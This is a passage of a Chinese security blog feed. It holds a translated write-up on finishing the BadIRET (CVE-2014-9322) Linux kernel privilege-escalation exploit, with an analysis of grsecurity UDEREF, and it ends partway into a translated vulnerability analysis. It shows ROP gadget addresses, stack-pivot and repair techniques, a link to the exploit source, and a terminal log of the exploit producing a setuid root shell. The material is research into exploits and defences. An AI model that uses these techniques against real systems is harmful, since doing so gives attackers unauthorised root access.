&lt;p&gt;我决定接受这个挑战去完整的实现Rafal的想法并且在成功的过程中解决了很多有趣的问题。我将以Rafal的分析文章结束作为开始，最终成功的实现stack pivoting和执行ROP gadgets（在他的描述里是去关掉CR4寄存器中关掉SMEP和在用户空间的页去执行’真’的shellcode/kernelcode）。&lt;/p&gt;

&lt;p&gt;*) Stack pivoting和ROP执行于follow_link()函数的上下文，这个函数是inline所以整个实现都在path_openat()的代码段里。这里是概述的上下文流程：&lt;/p&gt;
&lt;pre&gt;
SyS_open -&amp;gt; SYSC_open -&amp;gt; do_sys_open -&amp;gt; do_filp_open -&amp;gt; path_openat -&amp;gt; follow_link()
&lt;/pre&gt;

&lt;p&gt;Inline函数调用相对地址，这可以最终重定向到我们的代码：&lt;/p&gt;
&lt;pre&gt;
...
   0xffffffff811b84ab &amp;lt;+955&amp;gt;:   jmpq   0xffffffff811b81b3 
   0xffffffff811b84b0 &amp;lt;+960&amp;gt;:   movl   $0x4,0x40(%r12)
   0xffffffff811b84b9 &amp;lt;+969&amp;gt;:   mov    0x30(%r15),%rax
   0xffffffff811b84bd &amp;lt;+973&amp;gt;:   mov    %r15,%rdi
   0xffffffff811b84c0 &amp;lt;+976&amp;gt;:   mov    %r12,%rsi
   0xffffffff811b84c3 &amp;lt;+979&amp;gt;:   mov    0x20(%rax),%rax
   0xffffffff811b84c7 &amp;lt;+983&amp;gt;:   callq  *0x8(%rax)
                                ^^^^^^^^^^^^^^^^^
   0xffffffff811b84ca &amp;lt;+986&amp;gt;:   cmp    $0xfffffffffffff000,%rax
   0xffffffff811b84d0 &amp;lt;+992&amp;gt;:   mov    %rax,%r15
   0xffffffff811b84d3 &amp;lt;+995&amp;gt;:   jbe    0xffffffff811b8532 
   0xffffffff811b84d5 &amp;lt;+997&amp;gt;:   mov    %r12,%rdi
   0xffffffff811b84d8 &amp;lt;+1000&amp;gt;:  mov    %eax,%ebx
   0xffffffff811b84da &amp;lt;+1002&amp;gt;:  callq  0xffffffff811b2930 
...
&lt;/pre&gt;

&lt;p&gt;在我们的代码执行后第一个问题来了，所有调用函数path_put(), do_last(), dput(), mntput()或者put_link()可能都会遇到内核锁。因为栈已经被pivoted可不会带来一个好的结局。另外，path_openat()里有很多inline函数，一些寄存器有特殊意义（指针指向特定的结构或者对象），所以内核去访问某个点可能会直接造成内核崩溃。&lt;/p&gt;

&lt;p&gt;一开始我尝试跟踪了所有有问题的执行过程和手工修复了一些，但这条路径下的寄存器/对象/spinlocks之间有太多的关联…（btw，不幸（幸运）的是，跟之前的版本相比，Linux内核3.xx改变了raw_spin_lock的内部描述，当你打算手工同步时这会成为一个问题）。&lt;/p&gt;

&lt;p&gt;这里需要一个更好的解决方案，如果你思考下关于pivoting自己你可能会找到一个方案。如果你打算手工修复所有在这个过程中遇到的问题你也能成功。如果你找到一条路径去把原始的栈帧”恢复“到stack pivoting之前的状态，这会帮你搞定所有的锁问题，正确的对栈进行unwind以及系统会稳定的运行。这是能实现的，让我们称她为reverse stack pivoting;-)。在stack pivot后，在临时寄存器里你应该会拥有一个你想知道的栈的合法地址。在我们的场景里稍微有些复杂，因为我们失去了地址的32位的最高有效位。ROP gadgets像：&lt;/p&gt;
&lt;pre&gt;
   0xffffffff8119f1ed &amp;lt;__mem_cgroup_try_charge+1949&amp;gt;:   xchg   %eax,%esp
   0xffffffff8119f1ee &amp;lt;__mem_cgroup_try_charge+1950&amp;gt;:   retq
&lt;/pre&gt;

&lt;p&gt;为什么这些gadget会产生而32 bits会丢失呢？请阅读Rafal的文章。&lt;/p&gt;

&lt;p&gt;所以，如果我们在直接pivoting后找到了一些能保存原始栈上32位最低有效位ROP gadget，我们可以尝试在把控制权交给内核前恢复和重构原始地址。我选择了如下ROP-gadget：&lt;/p&gt;
&lt;pre&gt;
   0xffffffff8152d8fe :       push   %rax
   0xffffffff8152d8ff :       pop    %rax
   0xffffffff8152d900 :       pop    %rbp
   0xffffffff8152d901 :       retq
&lt;/pre&gt;

&lt;p&gt;去执行push %rax（这个值事实上高位被清零了）和保存值后移动栈指针。在这个点上我们可以精确的计算它会存在哪里。&lt;/p&gt;

&lt;p&gt;问题解决了（reverse-stack pivot胜利 :P）&lt;/p&gt;

&lt;p&gt;*) 如果你的shellcode执行时间过长，有很大的概率进程调度器会让更紧急的任务先执行， – 取决于当前的执行和什么样的任务会抢占。你可能经常收到APIC时间中断去更新进程时间，在有些情况下可能会带给你的漏洞利用一些麻烦，你必须考虑这些事情！&lt;/p&gt;

&lt;p&gt;btw.如果你运气不好，在做stack pivoting时刚好被抢占;p（Shawn:这种概率都遇上了你也就认了吧，可能真是上帝让你别去日你的当前目标；-））&lt;/p&gt;

&lt;p&gt;*) 我们的代码执行时但proc_root结构被损坏…;-) 这不是我们愿意看到的。如果有其他进程对/proc文件系统有任何操作，它会戏剧性的增加内核崩溃的概率。proc_root.subdir值必须尽快被恢复以避免系统被随机的crash掉。有几种可能的方法：&lt;/p&gt;

&lt;p&gt;a) 反而覆盖subdir的6 bytes只覆盖其中5个，这样其中3 bytes未碰。这意味着我们可以通过0xffff8800和最高有效位相加来轻松重构原始值，每一个单独byte最多256次尝试。内核crash的概率很低（触及到未映射的页）。另外，这个需要用户空间分配16MB去保证引用被覆盖的proc_root.subdir总是在我们控制的内存里。&lt;/p&gt;

&lt;p&gt;b) 我们可以通过’阻止’#PF来爆破整个地址。在一段很短的时间里，我们可以用一段简单程序覆盖#PF处理程序：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;从栈上获得异常&lt;/li&gt;
  &lt;li&gt;改变已知映射会造成crash的地址&lt;/li&gt;
  &lt;li&gt;重启错误处理指令&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;原生的爆破循环会继续运行&lt;/p&gt;

&lt;p&gt;c) 忽略所有的问题，仅仅去重构能通过爆破获得的剩下的bytes。很明显这很稳定和高效，我们知道HSB是0xfff8800和两个LSB bytes。我们需要找到2个未知的bytes。在Linux上（与Windows相反），内核内存不被paged out（swapped out）。去爆破中间的2个bytes来重构地址时访问到未映射的内存页概率是很低的 – believe me or not, it works well :)&lt;/p&gt;

&lt;p&gt;问题同样是如何判断地址是正确的。这很简单，struct proc_dir_entry有’parent’。我们必须找到proc_root(已知地址）的特定offset。最终，我们检查了65536个地址，#FP的概率也是很低的。我从来没遇到过那种情况。&lt;/p&gt;

&lt;p&gt;总结我们的shellcode必须：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;保存原生的栈指针值&lt;/li&gt;
  &lt;li&gt;关闭中断（防止被抢占）和开始重构被污染的proc_root.subdir值&lt;/li&gt;
  &lt;li&gt;实现真正的(s)hellcode&lt;/li&gt;
  &lt;li&gt;恢复原生栈指针&lt;/li&gt;
  &lt;li&gt;恢复栈帧指针&lt;/li&gt;
  &lt;li&gt;恢复寄存器指向的内部对象&lt;/li&gt;
  &lt;li&gt;启动中断和返回正常内核执行&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;grsecurity--uderef&quot;&gt;3) Grsecurity =&amp;gt; UDEREF&lt;/h2&gt;

&lt;p&gt;之前我提到过Rafal的研究曾经被spender给“看到”过：&lt;/p&gt;

&lt;p&gt;http://twitter.com/grsecurity/status/562363332079144960
http://twitter.com/grsecurity/status/562363788125831172&lt;/p&gt;

&lt;p&gt;另外，一些人建议UDEREF和SMAP一样能高效的防御这个漏洞：&lt;/p&gt;

&lt;p&gt;http://seclists.org/oss-sec/2014/q4/1052&lt;/p&gt;

&lt;pre&gt;
&quot;这可能是一个容易的提权的漏洞利用，但除了针对带有SMAP和UDEREF的系统。在
SMAP/UDEREF上，假定mitigation都是奏效的，这个bug的影响可能会局限于大规
模的memory corruption和crash或者重启。&quot;
&lt;/pre&gt;

&lt;p&gt;这并不是完全正确。UDEREF可能跟（事实上，甚至远超）SMAP一样高效，或者仅像SMEP（在AMD64上）一样有效的防御漏洞利用。但问题出在哪里呢？目前针对AMD64平台，UDEREF有3种不同的实现：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;慢/弱的遗留实现&lt;/li&gt;
  &lt;li&gt;针对Sandy Bridge(Shawn：2011年）和后续CPU的强实现&lt;/li&gt;
  &lt;li&gt;针对Sandy Bridge和后续CPU的快/弱实现&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;第一个针对AMD64平台的UDEREF实现是“弱”实现，相关信息PaX team也有描述：&lt;/p&gt;

&lt;p&gt;http://grsecurity.net/pipermail/grsecurity/2010-April/001024.html&lt;/p&gt;

&lt;pre&gt;
&quot;(...)所以amd64的UDEREF做了些什么呢？在用户空间-&amp;gt;内核空间的转换中基本上
unmaps了原始用户地址范围和重新映射到了不同的地址上并且标记为不可执行
/supervisor权限（所以至少直接的代码执行作为漏洞利用是无法奏效的）
&lt;/pre&gt;

&lt;p&gt;然后接着：&lt;/p&gt;

&lt;pre&gt;
&quot;(..) UDEREF/amd64不保证（合法）用户空间访问函数当用户空间被允许（一些
像特定系统作为用户空间临时访问内核内存，这在UDEREF/i386上被强制一致，而
在AMD64上则没有）不可以直接访问内核内存。所以如果有BUG能骗内核进入用户
空间访问的指针又恰好指向内核空间的话就能利用成功，这一点不像i386的实现。

另外一件糟糕的事情是用户空间的阴影区域，这造成了2个后果：1，用户空间地
址大小小于UDEREF（42 vs 47 bits，这种减小最终影响ASLR）， 2，这个阴影区
域总是映射着，所以内核代码异常访问这个区间并不会造成oops而且也是可被利
用的（如果一个漏洞利用能让内核deref这一区域里的任意地址）(...)&quot;
&lt;/pre&gt;

&lt;p&gt;== weak UDEREF ==
这意味着实际上UDEREF类似SMEP。所以如何能成功的漏洞利用有这个版本的UDEREF的系统呢？你只需要修改ROP。不像在CR4寄存器中关掉SMEP位，而是从用户空间实现完整的ROP的shellcode。这是可能的，“弱”UDEREF实现无法防御这种利用。&lt;/p&gt;

&lt;p&gt;== “new” UDEREF ==&lt;/p&gt;

&lt;p&gt;为什么“强”UDEREF实现是不同的而为什么她需要Sandy Bridge架构的支持？&lt;/p&gt;

&lt;p&gt;对，这是有趣的部分。我从没见关于”新“版UDEREF来自于官方的任何信息。我都没注意到这些实现有些变动是在我玩漏洞利用时产生的;-)&lt;/p&gt;

&lt;p&gt;强UDEREF实现使用的Sandy Bridge++特性被称为PCID，PCID在TLB中打”tags”（Shawn:有些人会翻译为标签）。UDEREF可以完全的分离用户空间和内核空间（通过创建新的PGD表）：&lt;/p&gt;
&lt;pre&gt;
static inline void enter_lazy_tlb(struct mm_struct *mm, struct task_struct *tsk)
{
++#if defined(CONFIG_X86_64) &amp;amp;&amp;amp; defined(CONFIG_PAX_MEMORY_UDEREF)
+     if (!(static_cpu_has(X86_FEATURE_PCID))) {
+             unsigned int i;+                pgd_t *pgd;
++            pax_open_kernel();
+             pgd = get_cpu_pgd(smp_processor_id(), kernel);
+             for (i = USER_PGD_PTRS; i &amp;lt; 2 * USER_PGD_PTRS; ++i)
+                     set_pgd_batched(pgd+i, native_make_pgd(0));
+             pax_close_kernel();
+     }
+#endif

+#if defined(CONFIG_X86_64) &amp;amp;&amp;amp; defined(CONFIG_PAX_MEMORY_UDEREF)
+             if (static_cpu_has(X86_FEATURE_PCID)) {
+                     if (static_cpu_has(X86_FEATURE_INVPCID)) {
+                             u64 descriptor[2];
+                             descriptor[0] = PCID_USER;
+                             asm volatile(__ASM_INVPCID : : &quot;d&quot;(&amp;amp;descriptor), &quot;a&quot;(INVPCID_SINGLE_CONTEXT) :
&quot;memory&quot;);
+                             if (!static_cpu_has(X86_FEATURE_STRONGUDEREF)) {
+                                     descriptor[0] = PCID_KERNEL;
+                                     asm volatile(__ASM_INVPCID : : &quot;d&quot;(&amp;amp;descriptor),
&quot;a&quot;(INVPCID_SINGLE_CONTEXT) : &quot;memory&quot;);
+                             }
+                     } else {
+                             write_cr3(__pa(get_cpu_pgd(cpu, user)) | PCID_USER);
+                             if (static_cpu_has(X86_FEATURE_STRONGUDEREF))
+                                     write_cr3(__pa(get_cpu_pgd(cpu, kernel)) | PCID_KERNEL | PCID_NOFLUSH);
+                             else
+                                     write_cr3(__pa(get_cpu_pgd(cpu, kernel)) | PCID_KERNEL);
+}
+             } else
+#endif
&lt;/pre&gt;

&lt;p&gt;最终，运行于内核模式的上下文将看不到任何用户空间的页。这个实现我个人相信比SMAP要强的多。为什么呢？&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;你不能只关闭CR4寄存器里的一个bit而关掉整个mitigation&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在SMAP的情况下，你可以看到用户空间的页（有存在的页表翻译用户空间地址，’P’位已经设置）但你仅仅是不能触碰到。在”新”UDEREF的情况下，你根本看不到用户空间（内核上下文的PGD是完全不同的，没有页表描述用户空间地址。’P’没有被设置）。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;这个UDEREF版本最早是在grsecurity 3.0于2014年2月引入的。干得漂亮！如果PaX/Grsecurity能公布一些他们的研究细节就更棒了;-)&lt;/p&gt;

&lt;p&gt;Btw. 这2个case都是接触到用户空间地址是一样的 - #PF会被生成;-)&lt;/p&gt;

&lt;p&gt;Btw2. 同样的“强”UDEREF可以不需要硬件PCID特性也能实现。但最大的区别就是性能。如果没有硬件PCID支持的情况下从性能的角度看，这个特性会很糟糕。&lt;/p&gt;

&lt;h2 id=&quot;summarizing-&quot;&gt;== Summarizing ==&lt;/h2&gt;

&lt;p&gt;这个漏洞可以在UDEREF下被利用，但不能在使用了Sandy Bridge++特性的“新”UDEREF下被利用。&lt;/p&gt;

&lt;p&gt;事实上，你仍然可以用这个漏洞针对“新”UDEREF用作DoS攻击？如何实现呢？这个很有趣，你可以强制#PF的无限循环;-) 当内核进入do_general_protection()函数后会尝试通过以下指令让GS基读取GDT：&lt;/p&gt;

&lt;pre&gt;
    0xffffffff8172910e :       mov    %gs:0xa880,%rbx
&lt;/pre&gt;

&lt;p&gt;这个情况下GS基是指向用户空间的内存。因为这里没有PTE条目（内核看不到用户空间的页），#PF将会被产生。page_fault()函数会被执行：&lt;/p&gt;

&lt;pre&gt;
page_fault -&amp;gt; do_page_fault -&amp;gt; __do_page_fault -&amp;gt; restore_args
&lt;/pre&gt;

&lt;p&gt;这会导致再次读GDT然后下一个#PF产生，就这样一直循环下去;-) 是的，你可以让内核崩溃掉但没办法做进一步的漏洞利用。漏洞利用在这里被阻止了。&lt;/p&gt;

&lt;h2 id=&quot;funny-facts-&quot;&gt;4) Funny facts;-)&lt;/h2&gt;

&lt;p&gt;a) 当你调用pthread_create()函数时，一些版本的libthread需要创建RWX权限的内存。这在PaX/Grsec的mmap()加固是不被允许的，当pthread_create()调用mmap()时进程会被杀掉;-) 我在Ubuntu LTS上运行grsecurity加固内核时遇到过这个情况。&lt;/p&gt;

&lt;p&gt;b) 在内核3.11.10-301.fc20.x86_64的__switch_to()函数实现中使用了OSXSAVE扩展（CR4寄存器的bit 18），但内核并不检查这个CPU是否有这个扩展：&lt;/p&gt;
&lt;pre&gt;
     0xffffffff81011714 &amp;lt;__switch_to+644&amp;gt;    xsaveopt64 (%rdi)
&lt;/pre&gt;

&lt;p&gt;__switch_to()是在禁用中断时运行，如果OSXSAVE扩展没有打开的话，CPU会生成一个#UD造成死锁。在进入__switch_to()指令之前，不管是否关闭中断都会锁住runqueue运行队列，在#UD的情况下不会被解锁。&lt;/p&gt;

&lt;p&gt;我好奇如果有人真的遇到过这个问题;-)&lt;/p&gt;

&lt;p&gt;c) Fedora 20作为测试环境，这个漏洞利用非常稳定（&lt;a href=&quot;http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz&quot;&gt;源代码在我的网站上已经公布&lt;/a&gt;）：&lt;/p&gt;
&lt;pre&gt;
[pi3@localhost clean_9322]$ cat z_shell.c
#include 

int main(void) {

   char *p_arg[] = { &quot;/bin/sh&quot;, NULL };

   setuid(0);
   seteuid(0);
   setgid(0);
   setegid(0);
   execv(&quot;/bin/sh&quot;,p_arg,NULL);

}
[pi3@localhost clean_9322]$ gcc z_shell.c -o z_shell
[pi3@localhost clean_9322]$ cp z_shell /tmp/pi3
[pi3@localhost clean_9322]$ ls -al /tmp/pi3
-rwxrwxr-x 1 pi3 pi3 8764 May  6 23:09 /tmp/pi3
[pi3@localhost clean_9322]$ id
uid=1000(pi3) gid=1000(pi3) groups=1000(pi3)
[pi3@localhost clean_9322]$ /tmp/pi3
sh-4.2$ id
uid=1000(pi3) gid=1000(pi3) groups=1000(pi3)
sh-4.2$ exit
exit
[pi3@localhost clean_9322]$ gcc -o procrop procrop.c setss.S
[pi3@localhost clean_9322]$ gcc -o p_write8 swapgs.c setss.S -lpthread
swapgs.c: In function ‘main’:
swapgs.c:175:29: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
               : &quot;r&quot;(4), &quot;r&quot;((int)p_to_d), &quot;r&quot;(1)
                             ^
[pi3@localhost clean_9322]$ ./procrop

        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
                           by Rafal 'n3rgal' Wojtczuk
                           &amp;amp;&amp;amp; Adam 'pi3' Zabrocki

                Usage: ./procrop 

                        Number:

                                1 - kernel [3.11.10-301.fc20.x86_64]

[pi3@localhost clean_9322]$ ./procrop 1 &amp;amp;
[1] 5827
[pi3@localhost clean_9322]$
        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
                           by Rafal 'n3rgal' Wojtczuk
                           &amp;amp;&amp;amp; Adam 'pi3' Zabrocki

        [+] Using kernel target: 3.11.10-301.fc20.x86_64

[pi3@localhost clean_9322]$
[pi3@localhost clean_9322]$
[pi3@localhost clean_9322]$ ps aux |grep procr
pi3       5827 83.0  0.0   4304   320 pts/1    RL   23:12   0:05 ./procrop 1
pi3       5829  0.0  0.1 112660   916 pts/1    S+   23:12   0:00 grep --color=auto procr
[pi3@localhost clean_9322]$ ./p_write8

        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
                           by Rafal 'n3rgal' Wojtczuk
                           &amp;amp;&amp;amp; Adam 'pi3' Zabrocki

                Usage: ./p_write8 

                        Number:

                                1 - kernel [3.11.10-301.fc20.x86_64]

[pi3@localhost clean_9322]$
[pi3@localhost clean_9322]$ ./p_write8 1

        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
                           by Rafal 'n3rgal' Wojtczuk
                           &amp;amp;&amp;amp; Adam 'pi3' Zabrocki

        [+] Using kernel target: 3.11.10-301.fc20.x86_64
        [+] mmap() memory in first 2GB of address space... DONE!
        [+] Preparing kernel structures... DONE! (ovbuf at 0x602140)
        [+] Creating LDT for this process... DONE!
        [+] Press enter to start fun-game...
[exploit] pthread runningAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[1]+  Done                    ./procrop 1
Segmentation fault (core dumped)
[pi3@localhost clean_9322]$ ls -al /tmp/pi3
-rwsrwsrwx 1 root root 8764 May  6 23:09 /tmp/pi3
[pi3@localhost clean_9322]$ id
uid=1000(pi3) gid=1000(pi3) groups=1000(pi3)
[pi3@localhost clean_9322]$ /tmp/pi3
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root),1000(pi3)
sh-4.2# exit
exit
[pi3@localhost clean_9322]$
&lt;/pre&gt;

&lt;p&gt;References:&lt;/p&gt;

&lt;p&gt;1) http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/&lt;/p&gt;

&lt;p&gt;2) https://rdot.org/forum/showthread.php?t=3341&lt;/p&gt;

&lt;p&gt;3) https://www.exploit-db.com/exploits/36266/&lt;/p&gt;

&lt;p&gt;4) http://blog.pi3.com.pl/?p=509&lt;/p&gt;

&lt;p&gt;5) http://twitter.com/grsecurity/status/562363332079144960&lt;/p&gt;

&lt;p&gt;6) http://twitter.com/grsecurity/status/562363788125831172&lt;/p&gt;

&lt;p&gt;7) http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz&lt;/p&gt;

&lt;p&gt;8) http://seclists.org/oss-sec/2014/q4/1052&lt;/p&gt;

&lt;p&gt;9) http://grsecurity.net/pipermail/grsecurity/2010-April/001024.html&lt;/p&gt;

&lt;p&gt;UPDATE:基于PCID的UDEREF实现最早是在2013年8月，而不是2014年2月。&lt;/p&gt;

&lt;p&gt;Best regards,&lt;/p&gt;

&lt;p&gt;Adam ‘pi3’ Zabrocki&lt;/p&gt;
</description>
        <pubDate>Mon, 06 Jul 2015 06:00:07 +0800</pubDate>
        <link>http://www.hardenedlinux.org/system-security/2015/07/06/badiret-exp.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2015/07/06/badiret-exp.html</guid>
        
        
        <category>system-security</category>
        
      </item>
    
      <item>
        <title>漏洞利用&quot;BadIRET&quot;分析(CVE-2014-9322, Linux内核提权)</title>
        <description>&lt;p&gt;作者：Rafal Wojtczuk，Feb 2 2015&lt;/p&gt;

&lt;p&gt;原文：&lt;a href=&quot;http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/&quot;&gt;Exploiting “BadIRET” vulnerability (CVE-2014-9322, Linux kernel privilege escalation)&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;译者：Shawn the R0ck, Feb 5 2015&lt;/p&gt;

&lt;p&gt;POC( 感谢Mickey提供的链接):
https://rdot.org/forum/showthread.php?t=3341&lt;/p&gt;

&lt;p&gt;Solidot相关报道：
http://www.solidot.org/story?sid=42951&lt;/p&gt;

&lt;p&gt;Shawn：Linux内核代码文件arch/x86/kernel/entry_64.S在3.17.5之前的版本都
没有正确的处理跟SS（堆栈区）段寄存器相关的错误，这可以让本地用户通过触
发一个 IRET指令从错误的地址空间去访问GS基地址来提权。这个编号为
CVE-2014-9322,漏洞于2014年11月23日被Linux内核社区修复，之后的几个礼拜里
没有出现公开的利用代码甚至相关的讨论。当人们快要遗忘这个威胁的时候，
Rafal Wojtczuk的分析文章Exploiting “BadIRET” vulnerability似乎在提醒我
们：别忘了斯拉夫兵工厂。Rafal在Fedora 20 64-bit GNU/Linux发行版上完成了
研究和测试工作，内核是3.11.10-301。也提醒那些平时不重视安全运维的企业和
个人，修复已知漏洞是必须的工作，因为你永远不知道你的敌人在哪里买卖什么
样的数字军火。对于这个漏洞，本文的结论是SMEP虽然被绕过了，但SMAP是依然
奏效的，这里只想提一下类似PaX/Grsecurity的UDEREF特性和SMAP类似，只是属
于纯软件实现，大概2006/2007年左右这个特性就已经有了而且被一些anarchy广
泛使用。这次Rafal也谈到说这个如此严重的漏洞居然数月都没有公开讨论，但其
实在12月中旬俄罗斯的某技术社区就已经进行了详细讨论并最终给出了PoC，这是
一次针对非英文世界的公开威胁情报分析的重大失误的典型案例。随着Intel在
CPU里实现了类似UDEREF的SMEP和SMAP等特性，主流GNU/Linux发行版的内核也在
逐渐支持此类特性，防御在升级的同时，欧罗巴的数字军火也在不断升级，2014
年已经有多个团队实现了不touch用户空间的SYSRET漏洞利用。&lt;/p&gt;

&lt;p&gt;这个漏洞影响很广，&lt;a href=&quot;https://security-tracker.debian.org/tracker/CVE-2014-9322&quot;&gt;Debian&lt;/a&gt;几乎所有社区还在维护的版本都受影响。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://access.redhat.com/security/cve/CVE-2014-9322&quot;&gt;RedHat的企业版&lt;/a&gt;RHEL 4/5/6/7都受影响。&lt;/p&gt;

&lt;h2 id=&quot;intro&quot;&gt;0. Intro&lt;/h2&gt;

&lt;p&gt;CVE-2014-9322的描述如下：&lt;/p&gt;
&lt;pre&gt;
linux内核代码文件arch/x86/kernel/entry_64.S在3.17.5之前的版本都没有正确
的处理跟SS（堆栈区）段寄存器相关的错误，这可以让本地用户通过触发一个
IRET指令从错误的地址空间去访问GS基地址来提权。
&lt;/pre&gt;

&lt;p&gt;这个漏洞于2014年11月23日被社区修复[2]，至今我并没有见到公开的利用代码和
详细的讨论。这篇文章我会尝试去解释这个漏洞的本质以及利用的过程。不幸的
是，我无法完全引用Intel白皮书[3]的所有内容，如果有读者不熟悉一些术语可
以直接查Intel白皮书。所有的实验都是在Fedora 20 64-bit发行版上完成的，内
核是3.11.10-301，所有的讨论基于64位进行。&lt;/p&gt;

&lt;p&gt;简单结论概要：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;通过测试，这个漏洞可以完全稳定的被利用。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;SMEP[4]不能阻止任意代码执行；SMAP[5]可以阻止任意代码执行。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Digression: kernel, usermode, iret
&lt;img src=&quot;https://bromiumlabs.files.wordpress.com/2015/01/badiret-cartoon.jpg?w=893&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;2. 漏洞&lt;/h2&gt;

&lt;p&gt;在一些情况下，linux内核通过iret指令返回用户空间时会产生一个异常。异常处
理程序把执行路径返回到了bad_iret函数，她做了：&lt;/p&gt;

&lt;pre&gt;
     /* So pretend we completed the iret and took the #GPF in user mode.*/
     pushq $0
     SWAPGS
     jmp general_protection
&lt;/pre&gt;

&lt;p&gt;正如这行评论所解释，接下来的代码流应该和一般保护异常(General
Protection)在用户空间发生时（转跳到#GP处理程序）完全相同。这种异常处理
情况大多是由iret指令引发的，e.g. #GP。&lt;/p&gt;

&lt;p&gt;问题在于#SS异常。如果有漏洞的内核（比如3.17.5）也有”espfix”功能（从
3.16引入的特性），之后bad_iret函数会在只读的栈上执行”push”指令，这会导
致页错误（page fault）而会直接引起两个错误。我不考虑这种场景；从现在开
始，我们只关注在3.16以前的没有”espfix”的内核。&lt;/p&gt;

&lt;p&gt;这个漏洞根源于#SS的异常处理程序没有符合
“pretend-it-was-#GP-in-userspace”[6]的规划，与#GP处理程序相比，#SS异常
处理会多做一次swapgs指令。如果你对swapgs不了解，请不要跳过下面的章节。&lt;/p&gt;

&lt;h2 id=&quot;swapgs&quot;&gt;3. 偏题：swapgs指令&lt;/h2&gt;

&lt;p&gt;当内存通过gs段进行访问时，像这样：&lt;/p&gt;

&lt;pre&gt;
mov %gs:LOGICAL_ADDRESS, %eax
&lt;/pre&gt;

&lt;p&gt;实际会发生以下几步：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;BASE_ADDRESS值从段寄存器的隐藏部分取出&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;内存中的线性地址LOGICAL_ADDRESS+BASE_ADDRESS被dereferenced（Shawn:
char *p; *p就是deref）。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;基地址是从GDT（或者LDT）继承过来的。无论如何，有一些情况是GS段基地址被
修改的动作不需要GDT的参与。&lt;/p&gt;

&lt;p&gt;引用自Intel白皮书：&lt;/p&gt;

&lt;p&gt;“SWAPGS把当前GS基寄存器值和在MSR地址C0000102H(IA32_KERNEL_GS_BASE)所包
含的值进行交换。SWAPGS指令是一个为系统软件设计的特权指令。(….)内核可
以使用GS前缀在正常的内存引用去访问[per-cpu]内核数据结构。”&lt;/p&gt;

&lt;p&gt;Linux内核为每个CPU在启动时分配一个固定大小的结构体来存放关键数据。之后
为每个CPU加载IA32_KERNEL_GS_BASE到相应的结构地址上，因此，通常的情况，
比如系统调用的处理程序是：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
